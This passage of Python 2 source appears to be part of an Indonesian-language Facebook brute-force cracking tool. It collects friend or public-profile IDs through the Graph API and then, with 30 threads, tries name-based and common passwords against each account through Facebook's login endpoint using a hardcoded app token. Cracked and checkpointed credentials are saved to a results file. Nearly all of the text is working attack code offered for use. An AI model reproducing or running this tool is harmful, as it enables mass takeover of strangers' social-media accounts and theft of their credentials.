    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSelesai ...'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone turki.'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m) ')
    os.system('python2 Crackv1.py')


def crack_saudi():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print ' '
    print '\x1b[1;97m _________ \x1b[1;92m   ________.    '
    print '\x1b[1;97m \\_   ___ \\ \x1b[1;92m_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[1;97m /    \\  \\/ \x1b[1;92m\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[1;97m \\     \\____ \x1b[1;92m|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[1;97m  \\______  / \x1b[1;92m|__|   |___  /'
    print '\x1b[1;97m         \\/      \x1b[1;92m       \\/ '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mSaudi Arabia\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m) \x1b[1;97mCrack Dari Daftar Teman'
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m)\x1b[1;97m Crack Dari Id Teman/Publik'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m)\x1b[1;97m Crack Dari File'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m) \x1b[1;97mKembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_saudi()


def pilih_saudi():
    teak = raw_input('\x1b[1;97m(?) Pilih \x1b[94m> \x1b[1;97m ')
    if teak == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_saudi()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print ' '
            print '\x1b[1;97m _________ \x1b[1;92m   ________.    '
            print '\x1b[1;97m \\_   ___ \\ \x1b[1;92m_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;97m /    \\  \\/ \x1b[1;92m\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____ \x1b[1;92m|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  / \x1b[1;92m|__|   |___  /'
            print '\x1b[1;97m         \\/      \x1b[1;92m       \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK SAUDI ARABIA \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print ' '
            print '\x1b[1;97m _________ \x1b[1;92m   ________.    '
            print '\x1b[1;97m \\_   ___ \\ \x1b[1;92m_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;97m /    \\  \\/ \x1b[1;92m\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____ \x1b[1;92m|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  / \x1b[1;92m|__|   |___  /'
            print '\x1b[1;97m         \\/      \x1b[1;92m       \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK SAUDI ARABIA \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) ID Publik \x1b[1;91m:\x1b[1;97m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama Akun \x1b[1;91m:\x1b[1;97m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) ID publik Tidak Ada!'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_saudi()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Tidak ada koneksi !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print ' '
            print '\x1b[1;97m _________ \x1b[1;92m   ________.    '
            print '\x1b[1;97m \\_   ___ \\ \x1b[1;92m_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;97m /    \\  \\/ \x1b[1;92m\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____ \x1b[1;92m|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  / \x1b[1;92m|__|   |___  /'
            print '\x1b[1;97m         \\/      \x1b[1;92m       \\/ '
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '             \x1b[1;94m>>> \x1b[1;93mCRACK SAUDI ARABIA \x1b[1;94m<<<'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mNama File\x1b[1;91m :\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada ! '
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali \x1b[1;97m)')
            except IOError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_saudi()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
            pilih_saudi()
        print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\x1b[0m'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\x1b[0m'
    print 50 * '\x1b[1;94m\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H\x1b[1;97m:\x1b[1;97m%M\x1b[1;97m:\x1b[1;97m%S')))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                oke = open('done/saudi.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                cek = open('done/saudi.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    oke = open('done/saudi.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    cek = open('done/saudi.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '1234'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        oke = open('done/saudi.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        cek = open('done/saudi.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = '123456'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            oke = open('done/saudi.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            cek = open('done/saudi.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['first_name'].lower() + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                oke = open('done/saudi.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                cek = open('done/saudi.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '12345'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    oke = open('done/saudi.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    cek = open('done/saudi.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['first_name'].lower() + '786'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        oke = open('done/saudi.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        cek = open('done/saudi.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '123'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            oke = open('done/saudi.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            cek = open('done/saudi.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSelesai ...'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone arab.'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m) ')
